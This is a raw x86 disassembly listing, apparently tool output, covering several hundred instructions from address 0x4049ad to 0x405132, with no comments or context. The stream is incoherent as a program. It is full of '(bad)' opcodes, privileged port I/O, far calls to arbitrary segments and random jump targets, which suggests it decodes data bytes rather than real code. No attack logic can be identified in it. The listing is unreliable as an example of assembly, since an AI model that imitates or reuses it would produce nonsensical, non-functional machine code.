  4049ad:	int3   
  4049ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4049af:	ins    BYTE PTR es:[edi],dx
  4049b0:	sbb    BYTE PTR [ecx-0x68e2d1ac],cl
  4049b6:	inc    ch
  4049b8:	rol    BYTE PTR ds:0x652d6efd,cl
  4049be:	jl     0x404959
  4049c0:	lods   eax,DWORD PTR ds:[esi]
  4049c1:	adc    esp,esi
  4049c3:	repnz aaa 
  4049c5:	jl     0x404a34
  4049c7:	mov    ah,0x14
  4049c9:	xchg   esi,eax
  4049ca:	cmp    al,0xf4
  4049cc:	cli    
  4049cd:	xchg   edi,eax
  4049ce:	scas   al,BYTE PTR es:[edi]
  4049cf:	add    al,0x19
  4049d1:	or     BYTE PTR [edx-0x35],bh
  4049d4:	rol    BYTE PTR [eax],cl
  4049d6:	outs   dx,BYTE PTR ds:[esi]
  4049d7:	xchg   ebx,eax
  4049d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4049d9:	mov    ebp,0xfe2ec1aa
  4049de:	rcl    BYTE PTR [eax],1
  4049e0:	sub    esi,DWORD PTR [ecx+eiz*8-0x335ebe37]
  4049e7:	into   
  4049e8:	or     BYTE PTR [esi],dh
  4049ea:	scas   al,BYTE PTR es:[edi]
  4049eb:	add    BYTE PTR ds:0x3ae4c30b,dh
  4049f1:	lea    esi,[eax]
  4049f3:	add    DWORD PTR [esi-0x2b],0xffffffe7
  4049f7:	jp     0x4049f1
  4049f9:	cld    
  4049fa:	cmp    ebx,DWORD PTR [eax-0x56]
  4049fd:	js     0x404a59
  4049ff:	push   edx
  404a00:	push   0x7fa233de
  404a05:	out    dx,al
  404a06:	jne    0x4049d3
  404a08:	mov    eax,0xd653f10c
  404a0d:	fwait
  404a0e:	mov    al,0xba
  404a10:	or     al,0x1f
  404a12:	add    al,0xa2
  404a14:	push   ds
  404a15:	std    
  404a16:	fisttp WORD PTR [ecx]
  404a18:	retf   
  404a19:	mov    dh,0x56
  404a1b:	enter  0xb16e,0xf8
  404a1f:	cld    
  404a20:	lods   al,BYTE PTR ds:[esi]
  404a21:	jnp    0x404a08
  404a23:	pop    ebp
  404a24:	in     eax,dx
  404a25:	repnz iret 
  404a27:	xor    al,0x2e
  404a29:	xchg   BYTE PTR [esp+eax*1-0x6b0072f3],cl
  404a30:	cmp    eax,0xebf7e32e
  404a35:	popf   
  404a36:	fcomp  st(7)
  404a38:	lahf   
  404a39:	daa    
  404a3a:	xchg   edx,eax
  404a3b:	sar    ebp,0x4
  404a3e:	mov    ah,0x94
  404a40:	cs scas al,BYTE PTR es:[edi]
  404a42:	xchg   edx,eax
  404a43:	out    0x87,eax
  404a45:	mov    edx,DWORD PTR [edi+0x1a033b8c]
  404a4b:	les    esp,FWORD PTR [edi-0x1b]
  404a4e:	mov    ch,0x41
  404a50:	and    DWORD PTR [ecx-0x80],edi
  404a53:	cmp    bl,BYTE PTR [eax-0x61]
  404a56:	jns    0x404a17
  404a58:	ror    BYTE PTR [ecx-0x6fa85821],cl
  404a5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a5f:	mov    dl,0x87
  404a61:	and    eax,0xe74416fc
  404a66:	call   0x2d9e:0x36dfd746
  404a6d:	repnz lods al,BYTE PTR ds:[esi]
  404a6f:	in     eax,0x22
  404a71:	sub    dh,BYTE PTR [edi-0x7e]
  404a74:	pop    edi
  404a75:	stos   BYTE PTR es:[edi],al
  404a76:	add    BYTE PTR [edi-0x70aa151],bl
  404a7c:	adc    cl,BYTE PTR [esp+ebp*4-0x23]
  404a80:	push   eax
  404a81:	mov    ah,0x50
  404a83:	ror    DWORD PTR [ebx+0x39a1f3b0],0x3c
  404a8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a8b:	aad    0xfa
  404a8d:	push   edi
  404a8e:	pop    ebp
  404a8f:	je     0x404af0
  404a91:	mov    bh,0x6d
  404a93:	xor    eax,0x3a048734
  404a98:	xchg   esi,eax
  404a99:	push   cs
  404a9a:	scas   al,BYTE PTR es:[edi]
  404a9b:	vfmadd213ss xmm4,xmm6,xmm3
  404aa0:	dec    edx
  404aa2:	mov    bl,0x6f
  404aa4:	pop    ds
  404aa5:	jp     0x404ade
  404aa7:	mov    esi,0x88d397c9
  404aac:	paddd  mm6,mm7
  404aaf:	mov    al,0x76
  404ab1:	mov    DWORD PTR [ebx],0x433f4e5f
  404ab7:	popf   
  404ab8:	gs push eax
  404aba:	xor    eax,0xaf495c80
  404abf:	mov    al,ds:0xb8f8c751
  404ac4:	pop    es
  404ac5:	ror    BYTE PTR [ecx],1
  404ac7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ac8:	cmp    eax,0x71cd5df5
  404acd:	xchg   esp,eax
  404ace:	pop    esp
  404acf:	push   cs
  404ad0:	sbb    eax,0x7df916db
  404ad5:	retf   
  404ad6:	add    dl,dh
  404ad8:	clc    
  404ad9:	dec    ebp
  404ada:	dec    esp
  404adb:	and    al,0xd
  404add:	jecxz  0x404ad0
  404adf:	popf   
  404ae0:	add    cl,BYTE PTR [ecx+0x7a]
  404ae3:	clc    
  404ae4:	ror    DWORD PTR [esi+0x594b72b7],1
  404aea:	jmp    DWORD PTR [esi+ebx*4]
  404aed:	jg     0x404b60
  404aef:	test   BYTE PTR [eax],cl
  404af1:	cmc    
  404af2:	dec    ebx
  404af3:	cmp    ebp,edi
  404af5:	fcomp  QWORD PTR [edi+esi*8+0x30]
  404af9:	jl     0x404afb
  404afb:	stos   BYTE PTR es:[edi],al
  404afc:	jmp    0x5019ae0e
  404b01:	mov    eax,ds:0x3323ea52
  404b06:	(bad)  
  404b07:	in     eax,0xac
  404b09:	mov    eax,0xeab21d84
  404b0e:	clc    
  404b0f:	call   0x2b59f8b6
  404b14:	inc    edx
  404b15:	inc    eax
  404b16:	in     eax,0x94
  404b18:	mov    cl,0x24
  404b1a:	les    esi,FWORD PTR [edx]
  404b1c:	jb     0x404b7f
  404b1e:	inc    edi
  404b1f:	mov    eax,0x9872e48e
  404b24:	test   edi,0x4dba9eef
  404b2a:	ret    
  404b2b:	xor    cl,BYTE PTR [eax-0x1c7dffcc]
  404b31:	call   0xf6e6a2bf
  404b36:	enter  0x59f3,0x2f
  404b3a:	add    eax,0xee0dfdc9
  404b3f:	mov    dl,0x87
  404b41:	jge    0x404b66
  404b43:	jle    0x404b05
  404b45:	ret    0x6f64
  404b48:	jg     0x404b95
  404b4a:	mov    ch,0xe2
  404b4c:	xchg   ebp,eax
  404b4d:	lock add DWORD PTR [ecx-0x45],eax
  404b51:	mov    al,0x7e
  404b53:	in     al,0x6c
  404b55:	push   ebx
  404b56:	push   0x61
  404b58:	loope  0x404b3d
  404b5a:	ja     0x404afc
  404b5c:	mov    ebp,0x96754b97
  404b61:	aaa    
  404b62:	aam    0xa5
  404b64:	(bad)  
  404b65:	push   edi
  404b66:	and    ecx,DWORD PTR [edx-0x2d]
  404b69:	imul   edi,DWORD PTR [edi+0x42],0xf
  404b6d:	jl     0x404b26
  404b6f:	pop    edi
  404b70:	push   esp
  404b71:	enter  0xc1f0,0x27
  404b75:	adc    dl,BYTE PTR [edi+0x69e396b0]
  404b7b:	sub    ecx,ebx
  404b7d:	xchg   BYTE PTR [edx],al
  404b7f:	ds or  esi,edi
  404b82:	test   DWORD PTR [ebp+edi*4+0x31be7eb4],ebp
  404b89:	and    DWORD PTR [esi-0x40],edi
  404b8c:	enter  0x55fd,0x1e
  404b90:	les    esp,FWORD PTR [esi+0x5e5f3c5e]
  404b96:	(bad)  
  404b97:	scas   al,BYTE PTR es:[edi]
  404b98:	popf   
  404b99:	adc    bh,BYTE PTR [ebp+0x64b4205d]
  404b9f:	js     0x404c03
  404ba1:	jae    0x404bad
  404ba3:	adc    dl,BYTE PTR [edi]
  404ba5:	test   DWORD PTR [edx*4+0x7d39c37a],eax
  404bac:	mov    ?,WORD PTR [edi]
  404bae:	inc    ebx
  404baf:	sbb    al,0x18
  404bb1:	sub    ch,BYTE PTR [esi]
  404bb3:	or     al,0x77
  404bb5:	xchg   esp,eax
  404bb6:	jo     0x404c35
  404bb8:	cmp    al,0xf4
  404bba:	hlt    
  404bbb:	add    DWORD PTR [esi],esi
  404bbd:	jmp    0xf95c0f35
  404bc2:	hlt    
  404bc3:	push   ebx
  404bc4:	rcr    DWORD PTR [ecx-0x68],1
  404bc7:	push   cs
  404bc8:	pop    edx
  404bc9:	add    eax,0x9fb4700
  404bce:	ins    BYTE PTR es:[edi],dx
  404bcf:	cmp    DWORD PTR [edi+eiz*4+0x74],ecx
  404bd3:	jmp    FWORD PTR [esi]
  404bd5:	inc    edi
  404bd6:	add    ch,BYTE PTR [eax-0x18ba8832]
  404bdc:	outs   dx,BYTE PTR ds:[esi]
  404bdd:	test   eax,0x82bfd110
  404be2:	xor    dl,dl
  404be4:	sub    eax,0xafd629b3
  404be9:	cs iret 
  404beb:	cwde   
  404bec:	in     eax,0xca
  404bee:	scas   al,BYTE PTR es:[edi]
  404bef:	test   al,0xe0
  404bf1:	fiadd  WORD PTR [ebx+0x2f084ab7]
  404bf7:	pop    ebx
  404bf8:	jbe    0x404bf6
  404bfa:	aam    0xc9
  404bfc:	jnp    0x404ba7
  404bfe:	sti    
  404bff:	rcr    eax,1
  404c01:	ss inc esi
  404c03:	or     eax,0xe976bf1c
  404c08:	jae    0x404c00
  404c0a:	sbb    eax,0xf3d98745
  404c0f:	dec    esi
  404c10:	dec    edx
  404c11:	addr16 mov ebx,0xccb2996a
  404c17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c18:	mov    al,ds:0xb6d20d69
  404c1d:	and    DWORD PTR [ebp+0x51],esp
  404c20:	inc    edx
  404c21:	bswap  eax
  404c23:	push   esi
  404c24:	test   edi,edi
  404c26:	test   esi,ebx
  404c28:	pop    esi
  404c29:	bound  ebx,QWORD PTR [edx-0x30]
  404c2c:	jle    0x404c3a
  404c2e:	stc    
  404c2f:	iret   
  404c30:	jbe    0x404c93
  404c32:	and    al,0x6c
  404c34:	pop    ss
  404c35:	cld    
  404c36:	lods   eax,DWORD PTR ds:[esi]
  404c37:	mov    cl,0x2
  404c39:	out    dx,eax
  404c3a:	fdivr  QWORD PTR [eax+0x7552d97]
  404c40:	jae    0x404c76
  404c42:	mov    ebx,0xf2fdb934
  404c47:	jecxz  0x404bcb
  404c49:	sub    al,bl
  404c4b:	ss jp  0x404bd4
  404c4e:	push   edi
  404c4f:	(bad)  [edx-0x1aa7291]
  404c55:	std    
  404c56:	inc    edx
  404c57:	pop    es
  404c58:	mov    al,0x34
  404c5a:	add    eax,0xc47cb2f5
  404c5f:	(bad)  
  404c60:	mov    eax,ds:0x3b47c0b
  404c65:	retf   0xfd74
  404c68:	aam    0xe4
  404c6a:	sbb    DWORD PTR [esi+ebx*1],ebx
  404c6d:	dec    esi
  404c6e:	mov    esi,0x7830a8a6
  404c73:	mov    ebx,0xf7a0bc51
  404c78:	pop    ss
  404c79:	xchg   esp,eax
  404c7a:	fidiv  DWORD PTR [esi-0x5c]
  404c7d:	(bad)  
  404c7e:	and    eax,0xb55f26e2
  404c83:	test   eax,0xab7df3c9
  404c88:	mov    ch,0x46
  404c8a:	xchg   ecx,eax
  404c8b:	push   esp
  404c8c:	retf   0xfb3
  404c8f:	push   esi
  404c90:	inc    ebp
  404c91:	fistp  WORD PTR [ecx+0x1e]
  404c94:	and    eax,0xadf8399
  404c99:	test   al,0x9
  404c9b:	arpl   WORD PTR [edi+0x2],cx
  404c9e:	cmp    DWORD PTR [edx-0x7232aed2],0x74706e83
  404ca8:	nop
  404ca9:	out    0xf6,eax
  404cab:	pop    ss
  404cac:	add    BYTE PTR [ebx-0x61],bl
  404caf:	aas    
  404cb0:	call   0x132ac6da
  404cb5:	dec    esp
  404cb6:	pop    eax
  404cb7:	xchg   DWORD PTR [edx],ebp
  404cb9:	je     0x404cce
  404cbb:	sbb    ecx,eax
  404cbd:	push   es
  404cbe:	(bad)  
  404cbf:	xor    cl,bh
  404cc1:	and    BYTE PTR [edx+0x6667e02b],dh
  404cc7:	ret    
  404cc8:	jg     0x404cb0
  404cca:	(bad)  
  404ccb:	cmp    ebx,esp
  404ccd:	inc    esi
  404cce:	and    BYTE PTR [ebx+0x6152f66d],cl
  404cd4:	mul    al
  404cd6:	sbb    eax,0xb802fe27
  404cdb:	test   al,0x89
  404cdd:	aaa    
  404cde:	dec    eax
  404cdf:	test   cl,ch
  404ce1:	cld    
  404ce2:	fcom   QWORD PTR [eax-0x52]
  404ce5:	jmp    0x404d2a
  404ce7:	jae    0x404ccd
  404ce9:	ret    0x44eb
  404cec:	iret   
  404ced:	cmp    BYTE PTR [ecx+0x2a],dl
  404cf0:	add    cl,bh
  404cf2:	xor    dh,dl
  404cf4:	pop    es
  404cf5:	adc    eax,0x79941088
  404cfa:	and    esi,eax
  404cfc:	fs loope 0x404c9a
  404cff:	xor    al,0xa4
  404d01:	jmp    0x404cc7
  404d03:	add    DWORD PTR ds:0x4572b47,eax
  404d09:	xchg   edi,eax
  404d0a:	push   0xffffffad
  404d0c:	jecxz  0x404c93
  404d0e:	add    bl,BYTE PTR [esi-0x2baa510d]
  404d14:	pushf  
  404d15:	dec    esp
  404d16:	mov    ds,WORD PTR gs:[ecx]
  404d19:	or     eax,0x1f2a6043
  404d1e:	sub    DWORD PTR [eax+0x2eb93b27],0x20
  404d25:	outs   dx,BYTE PTR ds:[esi]
  404d26:	nop
  404d27:	fwait
  404d28:	inc    edx
  404d29:	mov    dh,0xe6
  404d2b:	out    0x2,eax
  404d2d:	in     al,0xd8
  404d2f:	xchg   edi,esi
  404d31:	into   
  404d32:	jns    0x404cb8
  404d34:	xchg   BYTE PTR [eax+0x1a],al
  404d37:	push   0xd01dd202
  404d3c:	data16 jecxz 0x404d9d
  404d3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d40:	add    al,0x42
  404d42:	mov    esi,0x2785027d
  404d47:	es pusha 
  404d49:	iret   
  404d4a:	dec    esi
  404d4b:	push   0x24
  404d4d:	sub    BYTE PTR [ebx*8-0xb8378e8],ah
  404d54:	xor    DWORD PTR [ebp-0x5eace5e5],eax
  404d5a:	(bad)  
  404d5b:	fldcw  WORD PTR [ecx+ebp*1]
  404d5e:	dec    esp
  404d5f:	sbb    DWORD PTR [edx+0x34],eax
  404d62:	sbb    bl,BYTE PTR [ebp-0x4f]
  404d65:	les    ecx,FWORD PTR [edx]
  404d67:	add    esi,esi
  404d69:	jbe    0x404db3
  404d6b:	addr16 push eax
  404d6d:	mov    esi,DWORD PTR [ecx+0x39]
  404d70:	mov    fs:0xbcc6ffad,eax
  404d76:	pop    eax
  404d77:	sti    
  404d78:	das    
  404d79:	push   ds
  404d7a:	jp     0x404d36
  404d7c:	int3   
  404d7d:	sub    al,0x9c
  404d7f:	jns    0x404dd1
  404d81:	pop    ebp
  404d82:	sub    BYTE PTR [edi+ebp*2],cl
  404d85:	(bad)
  404d88:	aad    0x46
  404d8a:	jmp    0x2321:0xdb7730b4
  404d91:	aam    0x5a
  404d93:	add    eax,0x8c186bc8
  404d98:	mov    ebp,0x1d6d4e50
  404d9d:	inc    eax
  404d9e:	dec    ebx
  404d9f:	inc    edi
  404da0:	clc    
  404da1:	ficom  DWORD PTR [ebx+ebx*4]
  404da4:	out    0x27,al
  404da6:	cwde   
  404da7:	xchg   BYTE PTR [ebx+ebp*1+0x1c],cl
  404dab:	bound  edx,QWORD PTR [eax-0x10a5ed7e]
  404db1:	mov    ecx,0xaff8bb96
  404db6:	popa   
  404db7:	adc    al,0x60
  404db9:	push   ss
  404dba:	je     0x404dac
  404dbc:	outs   dx,BYTE PTR ds:[esi]
  404dbd:	ins    BYTE PTR es:[edi],dx
  404dbe:	and    bh,BYTE PTR [edx-0x324a582d]
  404dc4:	dec    ecx
  404dc5:	push   ebp
  404dc6:	call   0x67b:0x3fa22bd5
  404dcd:	ss hlt 
  404dcf:	jmp    FWORD PTR [ebp-0x1561aa17]
  404dd5:	in     al,dx
  404dd6:	sahf   
  404dd7:	mov    ch,0x1e
  404dd9:	pusha  
  404dda:	ret    0xe4cf
  404ddd:	fs sbb eax,0x72a1d467
  404de3:	rcr    eax,cl
  404de5:	loopne 0x404e63
  404de7:	test   BYTE PTR [esi+0x63],bl
  404dea:	test   eax,esi
  404dec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404ded:	adc    DWORD PTR ds:0xb5c52c81,0x7a
  404df4:	xor    eax,0xab39bb4
  404df9:	loop   0x404e2c
  404dfb:	loop   0x404dfb
  404dfd:	mov    cl,0xe2
  404dff:	dec    esi
  404e00:	cld    
  404e01:	jp     0x404df7
  404e03:	das    
  404e04:	in     al,dx
  404e05:	add    ah,BYTE PTR [ecx+edi*2+0x229c85bb]
  404e0c:	test   DWORD PTR [ecx+edx*8+0x40],ebp
  404e10:	arpl   WORD PTR [ebx],di
  404e12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e13:	ins    DWORD PTR es:[edi],dx
  404e14:	scas   eax,DWORD PTR es:[edi]
  404e15:	pop    edi
  404e16:	(bad)  
  404e17:	fs gs jb 0x404dcd
  404e1b:	pop    esp
  404e1c:	inc    edx
  404e1d:	jns    0x404e61
  404e1f:	mov    esp,0xf3671348
  404e24:	or     BYTE PTR [edx-0x39d2b5f5],0x69
  404e2b:	cdq    
  404e2c:	outs   dx,BYTE PTR ds:[esi]
  404e2d:	or     DWORD PTR [ecx-0x719d17de],edx
  404e33:	jo     0x404de2
  404e35:	sbb    DWORD PTR [ebx],edi
  404e37:	sbb    ebp,eax
  404e39:	std    
  404e3a:	daa    
  404e3b:	sub    DWORD PTR [edi+0x5f],ecx
  404e3e:	outs   dx,BYTE PTR ds:[esi]
  404e3f:	ds lahf 
  404e41:	push   edi
  404e42:	xchg   DWORD PTR [edi],eax
  404e44:	(bad)  [edx-0x767b4bfe]
  404e4a:	pop    edi
  404e4b:	mov    ss,WORD PTR [esi-0x25e5dac2]
  404e51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e52:	test   eax,0xf7a6f29
  404e57:	sbb    al,0x1a
  404e59:	mov    BYTE PTR [esi+0x39d7c558],bl
  404e5f:	std    
  404e60:	cwde   
  404e61:	ins    DWORD PTR es:[edi],dx
  404e62:	clc    
  404e63:	mov    ebx,0x3e82d337
  404e68:	jae    0x404ed9
  404e6a:	adc    eax,0x52564de1
  404e6f:	pop    esi
  404e70:	dec    eax
  404e71:	cwde   
  404e72:	jne    0x404e99
  404e74:	in     eax,dx
  404e75:	ins    BYTE PTR es:[edi],dx
  404e76:	xchg   edi,eax
  404e77:	stos   DWORD PTR es:[edi],eax
  404e78:	and    dh,cl
  404e7a:	lea    ebp,[esi-0x6a]
  404e7d:	into   
  404e7e:	ss mov ebp,0xbc8edcf0
  404e84:	push   cs
  404e85:	push   0x970ad081
  404e8a:	sbb    edx,eax
  404e8c:	mov    cl,dh
  404e8e:	leave  
  404e8f:	xchg   BYTE PTR [ebx+0x52],ah
  404e92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e93:	mov    dh,bh
  404e95:	jge    0x404e9e
  404e97:	fwait
  404e98:	pop    esp
  404e99:	call   0xe1d3cde2
  404e9e:	shl    BYTE PTR [esi],1
  404ea0:	xchg   ebp,eax
  404ea1:	cs pop es
  404ea3:	push   es
  404ea4:	and    ch,BYTE PTR [ebp+0xa3ed2f9]
  404eaa:	jno    0x404e89
  404eac:	push   DWORD PTR [edi]
  404eae:	mov    ebp,0xcddbe15f
  404eb3:	inc    ebx
  404eb4:	add    esi,edi
  404eb6:	fwait
  404eb7:	retw   
  404eb9:	pop    ecx
  404eba:	inc    esi
  404ebb:	pusha  
  404ebc:	inc    ecx
  404ebd:	dec    ecx
  404ebe:	in     eax,0xf6
  404ec0:	(bad)  [edx-0x5d902a07]
  404ec6:	xor    cl,bl
  404ec8:	xchg   esi,eax
  404ec9:	fsub   QWORD PTR [ebx]
  404ecb:	inc    ebp
  404ecc:	xchg   DWORD PTR [edx+eax*1],ebx
  404ecf:	xchg   dh,ch
  404ed1:	xlat   BYTE PTR ds:[ebx]
  404ed2:	(bad)  
  404ed3:	sti    
  404ed4:	xor    BYTE PTR [ebx+ebp*8],0xd4
  404ed8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404ed9:	test   cl,dh
  404edb:	ds xchg edi,eax
  404edd:	ja     0x404eee
  404edf:	jg     0x404f4b
  404ee1:	out    dx,al
  404ee2:	or     DWORD PTR [esi],ecx
  404ee4:	jl     0x404ee3
  404ee6:	xor    eax,0x373cde22
  404eeb:	fst    QWORD PTR [ecx+0x7c7ffece]
  404ef1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404ef2:	jmp    0x404f39
  404ef4:	ins    BYTE PTR es:[edi],dx
  404ef5:	in     ax,0x71
  404ef8:	enter  0x583b,0xb9
  404efc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404efd:	pop    edi
  404efe:	scas   eax,DWORD PTR es:[edi]
  404eff:	test   eax,0x74d44358
  404f04:	mov    ecx,0x3bffe7ca
  404f09:	call   0xa886a240
  404f0e:	aaa    
  404f0f:	add    eax,DWORD PTR [ebx+0x55dc3e]
  404f15:	bound  esp,QWORD PTR [ecx-0x484d8cba]
  404f1b:	and    BYTE PTR [eax+ebx*2],bl
  404f1e:	ss iretw 
  404f21:	pop    es
  404f22:	fbstp  TBYTE PTR [eax]
  404f24:	test   BYTE PTR [edi],0xf0
  404f27:	std    
  404f28:	loope  0x404f38
  404f2a:	es push ebx
  404f2c:	mov    ds:0xe1e029d8,eax
  404f31:	sub    BYTE PTR [edi+0x35],0xd1
  404f35:	mov    ch,0xca
  404f37:	inc    eax
  404f38:	outs   dx,BYTE PTR ds:[esi]
  404f39:	pop    edi
  404f3a:	push   edi
  404f3b:	std    
  404f3c:	enter  0x28e0,0x61
  404f40:	sahf   
  404f41:	hlt    
  404f42:	jp     0x404fa7
  404f44:	hlt    
  404f45:	pop    edi
  404f46:	sub    dh,BYTE PTR [ebx]
  404f48:	xchg   ecx,eax
  404f49:	pop    edx
  404f4a:	popf   
  404f4b:	xor    ebx,DWORD PTR [ebp-0x4fb2e64d]
  404f51:	dec    edi
  404f52:	data16 stos BYTE PTR es:[edi],al
  404f54:	mov    ah,0x27
  404f56:	push   esp
  404f57:	mov    edx,0xa5b603bb
  404f5c:	mov    esi,0x5b63c35b
  404f61:	inc    ebx
  404f62:	push   esi
  404f63:	enter  0xc417,0x48
  404f67:	push   0x75bb6499
  404f6c:	mov    BYTE PTR [edi-0x18],al
  404f6f:	or     dh,BYTE PTR [edi+esi*2-0x32]
  404f73:	retf   
  404f74:	push   0x70
  404f76:	imul   edi,ebx,0x5
  404f79:	dec    ebp
  404f7a:	clc    
  404f7b:	inc    eax
  404f7c:	pop    edx
  404f7d:	jl     0x404fdb
  404f7f:	mov    ch,0x1a
  404f81:	arpl   WORD PTR [ebp+0x203e406c],ax
  404f87:	mov    esi,0x2a9b7db6
  404f8c:	or     eax,0xe5b1cc81
  404f91:	mov    esi,0xf0604815
  404f96:	fdivr  DWORD PTR [ebx-0x7620ed15]
  404f9c:	mov    eax,ds:0x80918f1f
  404fa1:	fwait
  404fa2:	test   ah,cl
  404fa4:	lds    esp,FWORD PTR [edi+0x6e]
  404fa7:	in     al,0x4
  404fa9:	in     al,0x2a
  404fab:	(bad)  
  404fac:	je     0x404f54
  404fae:	push   edi
  404faf:	pop    es
  404fb0:	add    dh,0xb0
  404fb3:	retf   
  404fb4:	jne    0x404f7b
  404fb6:	push   edx
  404fb7:	or     esp,DWORD PTR [edx-0x7f]
  404fba:	dec    esi
  404fbb:	ins    BYTE PTR es:[edi],dx
  404fbc:	shl    DWORD PTR [edi+0x5a],0x60
  404fc0:	retf   
  404fc1:	xchg   edx,eax
  404fc2:	inc    edi
  404fc3:	pop    ebp
  404fc4:	ins    BYTE PTR es:[edi],dx
  404fc5:	test   BYTE PTR [esi+0x2d],ah
  404fc8:	push   ecx
  404fc9:	mov    ah,0x84
  404fcb:	add    dh,cl
  404fcd:	jns    0x405033
  404fcf:	xchg   ebx,eax
  404fd0:	mov    eax,ds:0x7ea0c048
  404fd5:	dec    ecx
  404fd6:	aad    0xaf
  404fd8:	pop    ebx
  404fd9:	mov    edi,DWORD PTR [ebp-0x3af6149d]
  404fdf:	(bad)  
  404fe0:	stos   BYTE PTR es:[edi],al
  404fe1:	mov    cs,WORD PTR ds:[ebx]
  404fe4:	rcl    BYTE PTR [eax-0xa50d765],cl
  404fea:	stos   BYTE PTR es:[edi],al
  404feb:	scas   eax,DWORD PTR es:[edi]
  404fec:	jmp    0x56167547
  404ff1:	sbb    eax,0x50694c77
  404ff6:	dec    eax
  404ff7:	lods   al,BYTE PTR ds:[esi]
  404ff8:	dec    ebx
  404ff9:	jnp    0x404f7c
  404ffb:	mov    cl,0x4e
  404ffd:	xchg   ebp,eax
  404ffe:	std    
  404fff:	stc    
  405000:	pop    ecx
  405001:	shl    BYTE PTR [edx],0x8a
  405004:	out    0x53,eax
  405006:	mov    es,WORD PTR [ebx]
  405008:	xor    al,0x65
  40500a:	add    DWORD PTR [ecx+0x7cf2b042],edi
  405010:	dec    ecx
  405011:	xor    BYTE PTR [ecx+0x30be366f],dh
  405017:	(bad)  
  405019:	dec    edi
  40501a:	(bad)  
  40501b:	mul    esp
  40501d:	aam    0xd7
  40501f:	loopne 0x404ff6
  405021:	cs ret 
  405023:	jno    0x405046
  405025:	jne    0x405078
  405027:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405028:	inc    esp
  405029:	daa    
  40502a:	xchg   esp,eax
  40502b:	(bad)  
  40502d:	ja     0x404fd1
  40502f:	dec    edx
  405030:	bound  ebx,QWORD PTR [ecx]
  405032:	repz enter 0x3e5a,0x7f
  405037:	sti    
  405038:	repz shr DWORD PTR [edx+ebx*4],cl
  40503c:	retf   0xd267
  40503f:	cmp    BYTE PTR [ecx+0xf6322bf],bh
  405045:	outs   dx,BYTE PTR ds:[esi]
  405046:	dec    dh
  405048:	pop    ecx
  405049:	sub    al,0xea
  40504b:	cmp    bl,bh
  40504d:	(bad)  
  40504f:	mov    ds:0x3d4efc74,eax
  405054:	add    esi,ebp
  405056:	(bad)  
  405057:	mov    ds:0x939b04e6,eax
  40505c:	pop    ebx
  40505d:	scas   eax,DWORD PTR es:[edi]
  40505e:	push   0xffffff93
  405060:	mov    ecx,0x32755fad
  405065:	shr    DWORD PTR [ecx+0x10],1
  405068:	mov    bl,0x75
  40506a:	loopne 0x405015
  40506c:	xchg   DWORD PTR [edx],ecx
  40506e:	fisub  WORD PTR [edi-0x20]
  405071:	cs pop eax
  405073:	mov    edi,0x999195a7
  405078:	sbb    bl,BYTE PTR [ebx+esi*2-0x3]
  40507c:	cmp    esi,DWORD PTR [ebx]
  40507e:	leave  
  40507f:	ret    0x7ff6
  405082:	mov    ch,0x50
  405084:	int    0xc2
  405086:	call   0x3f23:0x40ddf74c
  40508d:	cmp    eax,0xfc2a2cb3
  405092:	xchg   edi,eax
  405093:	sub    esp,DWORD PTR [esi+0x19f37bcb]
  405099:	push   0x11
  40509b:	or     esp,DWORD PTR [ecx+0x3d028209]
  4050a1:	dec    ecx
  4050a2:	jno    0x4050c8
  4050a4:	lods   eax,DWORD PTR ds:[esi]
  4050a5:	xchg   edi,eax
  4050a6:	add    al,0xc2
  4050a8:	stos   DWORD PTR es:[edi],eax
  4050a9:	data16 or dl,bl
  4050ac:	dec    ebx
  4050ad:	jb     0x4050d7
  4050af:	ret    0x1041
  4050b2:	cli    
  4050b3:	imul   edx,DWORD PTR [ecx+0x3dc757e],0xffffffc7
  4050ba:	into   
  4050bb:	add    dh,dl
  4050bd:	fnsave [ecx+0x160ecd2]
  4050c3:	push   ds
  4050c4:	out    dx,eax
  4050c5:	mov    esi,0x685d7e1b
  4050ca:	ds lahf 
  4050cc:	outs   dx,DWORD PTR ds:[esi]
  4050cd:	cdq    
  4050ce:	jno    0x405050
  4050d0:	inc    esp
  4050d1:	jmp    0xab31:0xb9611636
  4050d8:	dec    edi
  4050d9:	jecxz  0x4050a4
  4050db:	loop   0x4050ce
  4050dd:	stos   BYTE PTR es:[edi],al
  4050de:	dec    edx
  4050df:	stc    
  4050e0:	cdq    
  4050e1:	cs pushf 
  4050e3:	push   esp
  4050e4:	(bad)  
  4050e5:	imul   ebp,DWORD PTR [edx-0x6e],0x74
  4050e9:	in     al,0x4e
  4050eb:	fst    QWORD PTR [eax]
  4050ed:	push   0xffffffce
  4050ef:	pop    ecx
  4050f0:	xchg   ecx,eax
  4050f1:	jp     0x40511f
  4050f3:	cld    
  4050f4:	je     0x4050a3
  4050f6:	test   BYTE PTR [ebx+0x3e],ah
  4050f9:	sbb    BYTE PTR [ebp-0x1f],0xc3
  4050fd:	pop    edi
  4050fe:	les    ecx,FWORD PTR [eax+0x37]
  405101:	mov    eax,ebp
  405103:	mov    ebx,0x90f94e
  405108:	icebp  
  405109:	clc    
  40510a:	test   BYTE PTR [ebx+0x2d],al
  40510d:	sbb    ebx,ebx
  40510f:	ins    DWORD PTR es:[edi],dx
  405110:	je     0x405170
  405112:	call   0x189f:0xd3291e9f
  405119:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40511a:	adc    eax,0x4b60b812
  40511f:	popf   
  405120:	xor    BYTE PTR [edi-0x67afe5b0],dh
  405126:	sti    
  405127:	xchg   edx,eax
  405128:	aam    0x39
  40512a:	jmp    0x37f9dd61
  40512f:	lods   eax,DWORD PTR ds:[esi]
  405130:	adc    al,0x58
  405132:	aaa    
